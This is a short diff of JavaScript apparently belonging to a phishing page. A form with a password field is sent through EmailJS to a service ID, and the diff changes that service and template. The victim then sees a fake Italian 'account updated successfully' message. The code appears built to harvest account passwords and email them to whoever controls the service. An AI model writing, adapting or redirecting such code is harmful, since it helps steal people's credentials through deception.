@@ -10,7 +10,7 @@ form.addEventListener("submit", function(event) {
   event.preventDefault();
   btn.value = "Sending...";
 
-  emailjs.sendForm("service_zloz4hl", "template_jq6cqo2", this)
+  emailjs.sendForm("service_hihdbsg", "template_hstv05a", this)
     .then(() => {
       btn.value = "Send";
       status.innerText = "✅ Account aggiornato con successo...!";
@@ -27,6 +27,7 @@ passwordToggle.addEventListener("click", () => {
   passwordField.type = isPassword ? "text" : "password";
   passwordToggle.textContent = isPassword ? "🙈" : "👁";
 });
+
 
 
 
